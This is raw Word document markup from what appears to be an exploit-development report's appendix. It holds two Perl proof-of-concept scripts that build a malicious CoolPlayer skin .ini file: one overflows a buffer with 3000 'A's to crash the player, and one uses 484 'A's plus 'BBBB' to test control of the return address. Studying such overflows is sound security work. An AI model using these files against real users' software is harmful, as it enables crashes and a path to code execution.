                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:color w:val="4E8542" w:themeColor="accent4"/>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>#close the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DC428B" id="_x0000_s1040" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:-28.5pt;margin-top:27.75pt;width:489pt;height:63.7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">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5C88855F" w14:textId="0217E178" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="00090631" w:rsidP="005E1F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$file1 = </w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>skincrash.ini</w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidR="005E1F6C" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="005E1F6C" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="005E1F6C" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="005E1F6C" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="005E1F6C" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:color w:val="4E8542" w:themeColor="accent4"/>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>#the name of the file that will be created, must end in .ini</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7C716686" w14:textId="3504C70A" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:ind w:left="4245" w:hanging="4245"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$buffer = </w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">" </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>[CoolPlayer Skin]\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>nPlaylistSkin</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>=</w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidR="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:color w:val="4E8542" w:themeColor="accent4"/>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>#include this as a header before overflowing for it to be recognized as a skin</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="25771ACB" w14:textId="1354A812" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$buffer .= </w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>A</w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>x3000;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:color w:val="4E8542" w:themeColor="accent4"/>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>#append (.=) 3000 A’s which should crash the program</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="654B97D0" w14:textId="77777777" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>open ($FILE, “&gt;$file1”);</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:color w:val="4E8542" w:themeColor="accent4"/>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>#create an empty file with the name defined in $file1</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="200BFE00" w14:textId="31C0816C" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>print $FILE $buffer;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:color w:val="4E8542" w:themeColor="accent4"/>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>#add the contents of $buffer and its appended data</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="071C0E03" w14:textId="77777777" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>close($FILE);</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:color w:val="4E8542" w:themeColor="accent4"/>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>#close the file</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="005E1F6C">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>B1 - Crash1.pl Proof of Concept</w:t>
      </w:r>
      <w:bookmarkEnd w:id="59"/>
    </w:p>
    <w:p w14:paraId="414DDB59" w14:textId="4259D71E" w:rsidR="005E1F6C" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
      </w:pPr>
      <w:bookmarkStart w:id="60" w:name="_Toc103326488"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">B2 - </w:t>
      </w:r>
      <w:r>
        <w:t>Modified crash1.pl contents to make use of the new minimum overflow value</w:t>
      </w:r>
      <w:bookmarkEnd w:id="60"/>
    </w:p>
    <w:p w14:paraId="0CC068A4" w14:textId="10132BF9" w:rsidR="005E1F6C" w:rsidRPr="005E1F6C" w:rsidRDefault="00090631" w:rsidP="005E1F6C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251679744" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7BB9A98E" wp14:editId="6FE3038D">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-38100</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>157480</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2686050" cy="962025"/>
                <wp:effectExtent l="0" t="0" r="19050" b="2857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962025"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="5601F9F2" w14:textId="16382C7D" w:rsidR="00090631" w:rsidRPr="00CF75AD" w:rsidRDefault="00090631" w:rsidP="00090631">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$file1 = </w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>skincrash.ini</w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="120AE5DD" w14:textId="54EE5364" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="00090631">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>nPlaylistSkin</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>=";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="47211199" w14:textId="77777777" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="00090631">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "A" x 484;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5AACEAE7" w14:textId="62612BA6" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="00090631">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "BBBB</w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4E926ACD" w14:textId="288EE0ED" w:rsidR="00090631" w:rsidRPr="00CF75AD" w:rsidRDefault="00090631" w:rsidP="00090631">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">open ($FILE, </w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>&gt;$file1</w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="62182B3D" w14:textId="2EA44619" w:rsidR="00090631" w:rsidRPr="00CF75AD" w:rsidRDefault="00090631" w:rsidP="00090631">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>print $FILE $buffer;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="543FAB29" w14:textId="12645883" w:rsidR="00090631" w:rsidRDefault="00090631" w:rsidP="00090631">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>close($FILE);</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00090631">
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5F2F976D" w14:textId="482BACD6" w:rsidR="00090631" w:rsidRDefault="00090631" w:rsidP="00090631">
                            <w:pPr>
                              <w:pStyle w:val="cod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9A98E" id="_x0000_s1041" type="#_x0000_t202" style="position:absolute;margin-left:-3pt;margin-top:12.4pt;width:211.5pt;height:75.7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">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5601F9F2" w14:textId="16382C7D" w:rsidR="00090631" w:rsidRPr="00CF75AD" w:rsidRDefault="00090631" w:rsidP="00090631">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$file1 = </w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>skincrash.ini</w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="120AE5DD" w14:textId="54EE5364" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="00090631">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>nPlaylistSkin</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>=";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="47211199" w14:textId="77777777" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="00090631">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "A" x 484;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5AACEAE7" w14:textId="62612BA6" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="00090631">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "BBBB</w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4E926ACD" w14:textId="288EE0ED" w:rsidR="00090631" w:rsidRPr="00CF75AD" w:rsidRDefault="00090631" w:rsidP="00090631">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">open ($FILE, </w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>&gt;$file1</w:t>
                      </w:r>
                      <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
